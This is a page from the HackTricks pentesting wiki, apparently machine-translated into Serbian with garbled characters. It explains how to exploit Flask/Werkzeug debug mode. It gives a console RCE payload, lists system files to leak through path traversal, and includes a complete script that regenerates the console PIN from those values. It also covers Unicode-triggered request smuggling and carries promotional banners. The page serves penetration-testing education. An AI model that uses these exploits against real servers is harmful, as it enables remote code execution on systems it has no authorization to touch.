# Werkzeug / Flask Debug

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**Odmah dostupna postavka za procenu ranjivosti i penetraciono testiranje**. Pokrenite potpuni pentest sa bilo kog mesta uz 20+ alata i funkcija koje idu od rekognicije do izve코tavanja. Ne zamenjujemo pentestere - razvijamo prilago캠ene alate, module za detekciju i eksploataciju kako bismo im vratili malo vremena da dublje istra쬰, otvore shell-ove i zabave se.

{% embed url="https://pentest-tools.com/" %}

## Console RCE

Ako je debug aktivan, mo쬰te poku코ati da pristupite `/console` i dobijete RCE.
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (117).png>)

Postoji nekoliko eksploata na internetu kao [ovaj](https://github.com/its-arun/Werkzeug-Debug-RCE) ili jedan u metasploit-u.

## Za코ti캖eno PIN-om - Putanja Prelaz

U nekim slu캜ajevima, **`/console`** krajnja ta캜ka 캖e biti za코ti캖ena PIN-om. Ako imate **ranjivost u prelazu datoteka**, mo쬰te da iscurite sve potrebne informacije za generisanje tog PIN-a.

### Werkzeug Console PIN Eksploit

Prisilite stranicu sa gre코kom za debagovanje u aplikaciji da biste videli ovo:
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
Poruka u vezi sa scenarijom "konzola zaklju캜ana" se pojavljuje kada se poku코ava pristupiti Werkzeug-ovom debug interfejsu, 코to ukazuje na potrebu za PIN-om za otklju캜avanje konzole. Predla쬰 se da se iskoristi PIN konzole analizom algoritma za generisanje PIN-a u Werkzeug-ovom inicijalizacionom fajlu (`__init__.py`). Mehanizam generisanja PIN-a mo쬰 se prou캜iti iz [**Werkzeug source code repository**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py), iako se savetuje da se pribavi stvarni kod servera putem ranjivosti u pretra쬴vanju fajlova zbog mogu캖ih razlika u verzijama.

Da bi se iskoristio PIN konzole, potrebna su dva skupa varijabli, `probably_public_bits` i `private_bits`:

#### **`probably_public_bits`**

* **`username`**: Odnosi se na korisnika koji je pokrenuo Flask sesiju.
* **`modname`**: Obi캜no ozna캜en kao `flask.app`.
* **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**: Obi캜no se re코ava u **Flask**.
* **`getattr(mod, '__file__', None)`**: Predstavlja punu putanju do `app.py` unutar Flask direktorijuma (npr., `/usr/local/lib/python3.5/dist-packages/flask/app.py`). Ako `app.py` nije primenljiv, **probajte `app.pyc`**.

#### **`private_bits`**

* **`uuid.getnode()`**: Dohvata MAC adresu trenutne ma코ine, pri 캜emu `str(uuid.getnode())` prevodi u decimalni format.
* Da bi se **odredila MAC adresa servera**, potrebno je identifikovati aktivni mre쬹i interfejs koji koristi aplikacija (npr., `ens3`). U slu캜ajevima nesigurnosti, **leak `/proc/net/arp`** da biste prona코li ID ure캠aja, zatim **izvucite MAC adresu** iz **`/sys/class/net/<device id>/address`**.
*   Konverzija heksadecimalne MAC adrese u decimalnu mo쬰 se izvr코iti kao 코to je prikazano u nastavku:

```python
# Primer MAC adrese: 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
* **`get_machine_id()`**: Spaja podatke iz `/etc/machine-id` ili `/proc/sys/kernel/random/boot_id` sa prvom linijom `/proc/self/cgroup` posle poslednjeg kosa (`/`).

<details>

<summary>Code for `get_machine_id()`</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

Kada se prikupe svi potrebni podaci, skripta za eksploataciju mo쬰 biti izvr코ena da generi코e Werkzeug konzolni PIN:

Kada se prikupe svi potrebni podaci, skripta za eksploataciju mo쬰 biti izvr코ena da generi코e Werkzeug konzolni PIN. Skripta koristi sastavljene `probably_public_bits` i `private_bits` da kreira he코, koji zatim prolazi kroz dalju obradu da bi proizvela kona캜ni PIN. Ispod je Python kod za izvr코avanje ovog procesa:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
Ovaj skript proizvodi PIN tako 코to he코ira spojene bitove, dodaje specifi캜ne soli (`cookiesalt` i `pinsalt`), i formatira izlaz. Va쬹o je napomenuti da se stvarne vrednosti za `probably_public_bits` i `private_bits` moraju ta캜no dobiti iz ciljanog sistema kako bi se osiguralo da generisani PIN odgovara onom koji o캜ekuje Werkzeug konzola.

{% hint style="success" %}
Ako ste na **starijoj verziji** Werkzeug-a, poku코ajte da promenite **he코 algoritam na md5** umesto sha1.
{% endhint %}

## Werkzeug Unicode karakteri

Kao 코to je prime캖eno u [**ovoj temi**](https://github.com/pallets/werkzeug/issues/2833), Werkzeug ne zatvara zahtev sa Unicode karakterima u header-ima. I kao 코to je obja코njeno u [**ovoj analizi**](https://mizu.re/post/twisty-python), to mo쬰 izazvati CL.0 Request Smuggling ranjivost.

To je zato 코to je u Werkzeug-u mogu캖e poslati neke **Unicode** karaktere i to 캖e uzrokovati da server **pukne**. Me캠utim, ako je HTTP veza kreirana sa header-om **`Connection: keep-alive`**, telo zahteva ne캖e biti pro캜itano i veza 캖e ostati otvorena, tako da 캖e **telo** zahteva biti tretirano kao **slede캖i HTTP zahtev**.

## Automatizovana Eksploatacija

{% embed url="https://github.com/Ruulian/wconsole_extractor" %}

## Reference

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)
* [**https://github.com/pallets/werkzeug/issues/2833**](https://github.com/pallets/werkzeug/issues/2833)
* [**https://mizu.re/post/twisty-python**](https://mizu.re/post/twisty-python)

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**Odmah dostupna postavka za procenu ranjivosti i penetraciono testiranje**. Izvr코ite potpuni pentest sa bilo kog mesta sa 20+ alata i funkcija koje idu od rekognicije do izve코tavanja. Ne zamenjujemo pentestere - razvijamo prilago캠ene alate, module za detekciju i eksploataciju kako bismo im vratili malo vremena da dublje istra쬰, otvore shell-ove i zabave se.

{% embed url="https://pentest-tools.com/" %}

{% hint style="success" %}
U캜ite i ve쬭ajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
U캜ite i ve쬭ajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr코ka HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitter-u** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
